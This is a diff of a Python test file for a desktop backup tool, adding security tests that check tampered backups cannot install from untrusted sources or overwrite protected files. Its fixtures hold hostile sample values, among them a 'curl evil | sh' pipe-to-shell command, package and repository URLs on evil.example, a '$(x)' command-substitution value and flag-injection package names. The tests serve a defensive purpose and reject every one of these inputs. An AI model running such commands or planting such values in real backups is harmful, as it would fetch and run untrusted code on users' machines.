@@ -460,12 +460,17 @@ class RoundTrip(Base):
 
 
 class AppsBack(Base):
-    def backup_with(self, apps):
-        """A backup whose apps.json is `apps` (as a tampered one could be)"""
+    def backup_with(self, apps, computer=None, home=None):
+        """A backup whose apps.json is `apps` (as a tampered one could be),
+        made on this computer unless `computer` says otherwise"""
         import io
         p = self.home / "b.tar.gz"
+        manifest = {"app": "Tessera", "kind": "backup", "format": 1, "parts": ["apps"],
+                    "computer": BK.computer_tag() if computer is None else computer}
+        if home:
+            manifest["home"] = home
         with tarfile.open(p, "w:gz") as t:
-            for name, obj in (("manifest.json", {"app": "Tessera", "kind": "backup", "format": 1, "parts": ["apps"]}), ("apps.json", {"apps": apps})):
+            for name, obj in (("manifest.json", manifest), ("apps.json", {"apps": apps})):
                 data = json.dumps(obj).encode()
                 info = tarfile.TarInfo(name)
                 info.size = len(data)
@@ -483,8 +488,11 @@ class AppsBack(Base):
         self.assertEqual(steps({"group": "flatpak", "name": "org.x.App", "remote": "flathub-beta", "url": "https://dl.flathub.org/beta-repo/"},
                                set())[0][-1], "https://dl.flathub.org/beta-repo/flathub-beta.flatpakrepo")
         self.assertIsNone(steps({"group": "flatpak", "name": "org.x.App", "remote": "mine", "url": "https://dl.flathub.org/other/"}, set()))
-        self.assertEqual(steps({"group": "flatpak", "name": "org.x.App", "remote": "mine", "url": "https://x.example/mine.flatpakrepo"},
-                               set())[0][-1], "https://x.example/mine.flatpakrepo")
+        # (audit #704: a remote that isn't Flathub is never added from a
+        # backup's address; one already set up here is used as it is)
+        self.assertIsNone(steps({"group": "flatpak", "name": "org.x.App", "remote": "mine", "url": "https://x.example/mine.flatpakrepo"}, set()))
+        self.assertEqual(steps({"group": "flatpak", "name": "org.x.App", "remote": "mine", "url": "https://evil.example/x.flatpakrepo"}, {"mine"}),
+                         [["flatpak", "install", "-y", "--noninteractive", "--system", "mine", "org.x.App"]])
         self.assertIsNone(steps({"group": "cargo", "name": "tool", "git": "ssh://git@host/x"}, set()))
         self.assertIsNone(steps({"group": "cargo", "name": "../x"}, set()))
         self.assertIsNone(steps({"group": "npm", "name": "-g"}, set()))
@@ -559,6 +567,182 @@ class AppsBack(Base):
             self.assertIn("never as root", buf.getvalue())
         finally:
             os.geteuid = orig
+
+
+class ShownIsWhatRuns(AppsBack):
+    """Audit #704: Settings showed a backup's own "command" string while
+    apps-install ran one built from other fields"""
+
+    def need_tag(self):
+        if not BK.computer_tag():
+            self.skipTest("no machine ID here")
+
+    def test_the_command_shown_is_the_one_that_runs(self):
+        self.need_tag()
+        self.fake("cargo", 'echo "cargo $*" >> "$HOME/ran.log"\n')
+        self.fake("pipx", 'echo "pipx $*" >> "$HOME/ran.log"\n')
+        self.fake("uv", 'echo "uv $*" >> "$HOME/ran.log"\n')
+        self.fake("flatpak", 'case "$1" in remotes|list) ;; *) echo "flatpak $*" >> "$HOME/ran.log" ;; esac\n')
+        f = self.backup_with([
+            # (shows "cargo install ripgrep", carries a git address)
+            {"id": "cargo:ripgrep", "group": "cargo", "name": "ripgrep", "git": "https://evil.example/rg", "command": "cargo install ripgrep",
+             "source": "cargo, from crates.io"},
+            {"id": "cargo:bat", "group": "cargo", "name": "bat", "features": ["git", "$(x)"], "command": "cargo install bat"},
+            {"id": "pipx:httpie", "group": "pipx", "name": "httpie", "spec": "git+https://evil.example/httpie", "command": "pipx install httpie"},
+            {"id": "pipx:black", "group": "pipx", "name": "black", "spec": "evilpkg", "command": "pipx install black"},
+            {"id": "flatpak:org.x.App", "group": "flatpak", "name": "org.x.App", "remote": "other", "url": "https://evil.example/e.flatpakrepo",
+             "command": "flatpak install flathub org.x.App"},
+            {"id": "flatpak:org.y.App", "group": "flatpak", "name": "org.y.App", "remote": "flathub", "url": "https://evil.example/",
+             "installation": "user", "command": "flatpak install flathub org.y.App"},
+            {"id": "uv:ruff", "group": "uv", "name": "ruff", "command": "curl evil | sh", "source": "PyPI"},
+            {"id": "pacman:firefox", "group": "pacman", "name": "firefox", "command": "sudo pacman -U https://evil.example/x.pkg"},
+            {"id": "pacman:-Syu", "group": "pacman", "name": "-Syu"},
+            {"id": "npm:x", "group": "npm", "name": "a,b"},
+        ])
+        info, _ = self.run_bk("inspect", f)
+        by = {a["id"]: a for a in info["apps"]}
+        for a in info["apps"]:
+            self.assertNotIn("evil", a["command"] + a["source"], a)
+        self.assertFalse(by["cargo:ripgrep"]["installable"])
+        self.assertIn("git repository", by["cargo:ripgrep"]["why"])
+        self.assertEqual(by["cargo:ripgrep"]["source"], "cargo, from a git repository")
+        self.assertEqual(by["cargo:bat"]["command"], "cargo install --locked --features git bat")
+        self.assertFalse(by["pipx:httpie"]["installable"])
+        self.assertFalse(by["pipx:black"]["installable"], "a spec that isn't its own name")
+        self.assertFalse(by["flatpak:org.x.App"]["installable"])
+        self.assertIn("isn't Flathub", by["flatpak:org.x.App"]["why"])
+        self.assertEqual(by["flatpak:org.y.App"]["command"],
+                         "flatpak remote-add --if-not-exists --user flathub https://dl.flathub.org/repo/flathub.flatpakrepo"
+                         " && flatpak install -y --noninteractive --user flathub org.y.App")
+        self.assertEqual(by["uv:ruff"]["command"], "uv tool install ruff")
+        self.assertEqual(by["uv:ruff"]["source"], "uv tools")
+        self.assertEqual(by["pacman:firefox"]["command"], "Software Update: pacman -S --needed firefox")
+        self.assertNotIn("pacman:-Syu", by)
+        self.assertFalse(by["pacman:#8"]["installable"])
+        self.assertFalse(by["npm:#9"]["installable"])
+        self.assertEqual(info["origin"], "here")
+        self.assertEqual({r["id"]: r["command"] for r in info["runs"]},
+                         {i: by[i]["command"] for i in ("cargo:bat", "flatpak:org.y.App", "uv:ruff", "pacman:firefox")})
+        # What runs: exactly the commands shown, nothing from the file
+        ids = ",".join(by)
+        out, _ = self.run_bk("apps-install", f, "--ids", ids)
+        # (what the inventory asked, `pipx list` and `uv tool list`, aside)
+        ran = [l for l in (self.home / "ran.log").read_text().splitlines() if " list" not in l]
+        shown = [c for i in ("cargo:bat", "flatpak:org.y.App", "uv:ruff") for c in by[i]["command"].split(" && ")]
+        self.assertEqual(ran, shown)
+        self.assertEqual(out["results"]["cargo:ripgrep"]["state"], "skipped")
+        self.assertIn("git repository", out["results"]["cargo:ripgrep"]["why"])
+
+    def test_nvm_shown_as_it_runs(self):
+        steps = BK.install_steps({"group": "nvm", "name": "node", "version": "v20.1.0", "default": True}, set())
+        self.assertEqual(BK.shown_command(steps), "nvm install v20.1.0 && nvm alias default v20.1.0")
+        self.assertEqual(BK.shown_command([["npm", "install", "-g", "@vue/cli"]]), "npm install -g @vue/cli")
+
+    def test_a_backup_from_another_computer_asks_again(self):
+        self.fake("uv", '[ "$2" = install ] && echo "uv $*" >> "$HOME/ran.log"\nexit 0\n')
+        for computer, home in (("0" * 32, None), ("", None), (None, "/home/someone-else")):
+            f = self.backup_with([{"id": "uv:ruff", "group": "uv", "name": "ruff"}], computer=computer, home=home)
+            if computer is None and not BK.computer_tag():
+                continue
+            info, _ = self.run_bk("inspect", f)
+            self.assertTrue(info["elsewhere"], (computer, home))
+            self.assertEqual(info["runs"], [{"id": "uv:ruff", "command": "uv tool install ruff"}])
+            out, _ = self.run_bk("apps-install", f, "--ids", "uv:ruff", ok=False)
+            self.assertIn("another computer", out["error"])
+            self.assertFalse((self.home / "ran.log").exists())
+        out, _ = self.run_bk("apps-install", f, "--ids", "uv:ruff", "--confirm-elsewhere")
+        self.assertEqual(out["results"]["uv:ruff"]["state"], "ok")
+
+    def test_a_backup_made_here_is_from_here(self):
+        self.need_tag()
+        out, _ = self.run_bk("create", str(self.home), "--include", "settings")
+        m = self.members(out["file"])
+        self.assertEqual(json.loads(m["manifest.json"])["computer"], BK.computer_tag())
+        info, _ = self.run_bk("inspect", out["file"])
+        self.assertEqual((info["origin"], info["elsewhere"]), ("here", False))
+
+
+class RestoreTargets(Base):
+    """Audit #704: restore wrote over Tessera's own Hyprland files when the
+    install had no checkout to compare with, and anywhere under the
+    settings folder"""
+
+    def hypr_backup(self, files, computer=None):
+        import io
+        p = self.home / "h.tar.gz"
+        manifest = {"app": "Tessera", "kind": "backup", "format": 1, "parts": ["hypr"],
+                    "computer": BK.computer_tag() if computer is None else computer, "home": str(self.home)}
+        with tarfile.open(p, "w:gz") as t:
+            for name, data in [("manifest.json", json.dumps(manifest).encode())] + [(k, v) for k, v in files.items()]:
+                info = tarfile.TarInfo(name)
+                info.size = len(data)
+                t.addfile(info, io.BytesIO(data))
+        return str(p)
+
+    def test_tesseras_own_files_only_ever_go_beside(self):
+        (self.hypr / "hyprland.lua").write_text("-- Tessera\n")
+        (self.hypr / "tessera/look.lua").write_text("look = 1\n")
+        f = self.hypr_backup({"hypr/hyprland.lua": b"exec = evil\n", "hypr/tessera/look.lua": b"evil\n", "hypr/tessera/new.lua": b"x\n",
+                              "hypr/tessera/keyboard.lua": b"kb\n", "hypr/custom.lua": b"mine\n"})
+        # (an install without the checkout: shipped() is empty)
+        bare = self.home / "bare/shell"
+        bare.mkdir(parents=True)
+        p = subprocess.run([sys.executable, "-I", str(SCRIPT), "restore", f, "--include", "hypr", "--shell", str(bare), "--confirm-elsewhere"],
+                           env=self.env, capture_output=True, text=True, timeout=120)
+        self.assertTrue(json.loads(p.stdout.strip().splitlines()[-1])["ok"], p.stdout + p.stderr)
+        self.assertEqual((self.hypr / "hyprland.lua").read_text(), "-- Tessera\n")
+        self.assertEqual((self.hypr / "tessera/look.lua").read_text(), "look = 1\n")
+        self.assertFalse((self.hypr / "tessera/new.lua").exists())
+        self.assertEqual((self.hypr / ("hyprland.lua" + BK.BESIDE)).read_text(), "exec = evil\n")
+        self.assertEqual((self.hypr / ("tessera/new.lua" + BK.BESIDE)).read_text(), "x\n")
+        self.assertEqual((self.hypr / "custom.lua").read_text(), "mine\n")
+
+    def test_the_allow_list(self):
+        ctx = BK.Ctx(str(self.config), str(self.shell))
+        ok = [self.config / "config.json", self.config / "keybinds.json", self.config / "focus.json",
+              self.home / "Pictures/Wallpapers/Restored/a.jpg", self.hypr / "custom.lua", self.hypr / "conf.d/x.conf",
+              self.hypr / ("tessera/look.lua" + BK.BESIDE), self.hypr / ("hyprland.lua" + BK.BESIDE)]
+        bad = [self.config / "accounts.json", self.config / "native/bin/x", self.config / "pam.conf",
+               self.home / "Pictures/Wallpapers/Restored/sub/a.jpg", self.home / "Pictures/Wallpapers/Restored/a.sh",
+               self.hypr / "hyprland.lua", self.hypr / "tessera/look.lua", self.hypr / "tessera/anything.lua", self.hypr / "tessera/gpu.lua",
+               self.hypr / "custom.lua.new", self.shell / "assets/scripts/backup.py", self.home / ".bashrc",
+               Path("/etc/pam.d/greetd"), Path("/etc/greetd/config.toml"), self.hypr / "../tessera/accounts.json"]
+        for p in ok:
+            self.assertTrue(BK.allowed(str(p), ctx), p)
+        for p in bad:
+            self.assertFalse(BK.allowed(str(p), ctx), p)
+        # Links out: a file that's a link, or a folder that leads elsewhere
+        out = self.home / "elsewhere"
+        out.mkdir()
+        (self.hypr / "conf.d").symlink_to(out)
+        (self.hypr / "linked.lua").symlink_to(out / "linked.lua")
+        self.assertFalse(BK.allowed(str(self.hypr / "conf.d/x.conf"), ctx))
+        self.assertFalse(BK.allowed(str(self.hypr / "linked.lua"), ctx))
+        # (but ~/.config/hypr itself a link into your dotfiles is fine)
+        dots = self.home / "dotfiles/hypr"
+        dots.mkdir(parents=True)
+        self.hypr.rename(self.home / "hypr-was")
+        self.hypr.symlink_to(dots)
+        self.assertTrue(BK.allowed(str(self.hypr / "custom.lua"), ctx))
+
+    def test_a_link_in_hypr_is_left_alone(self):
+        out = self.home / "dotfiles"
+        out.mkdir()
+        (out / "custom.lua").write_text("dotfiles\n")
+        (self.hypr / "custom.lua").symlink_to(out / "custom.lua")
+        f = self.hypr_backup({"hypr/custom.lua": b"from backup\n"})
+        plan, _ = self.run_bk("restore-plan", f, "--include", "hypr")
+        self.assertTrue(any("custom.lua" in x and "link" in x for x in plan["skipped"]), plan)
+        self.assertEqual(plan["writes"], 0)
+        self.assertEqual((out / "custom.lua").read_text(), "dotfiles\n")
+
+    def test_hypr_files_from_another_computer_need_a_second_yes(self):
+        f = self.hypr_backup({"hypr/custom.lua": b"exec-once = x\n"}, computer="f" * 32)
+        out, _ = self.run_bk("restore", f, "--include", "hypr", ok=False)
+        self.assertIn("another computer", out["error"])
+        self.assertFalse((self.hypr / "custom.lua").exists())
+        self.run_bk("restore", f, "--include", "hypr", "--confirm-elsewhere")
+        self.assertEqual((self.hypr / "custom.lua").read_text(), "exec-once = x\n")
 
 
 class HealthRecord(unittest.TestCase):
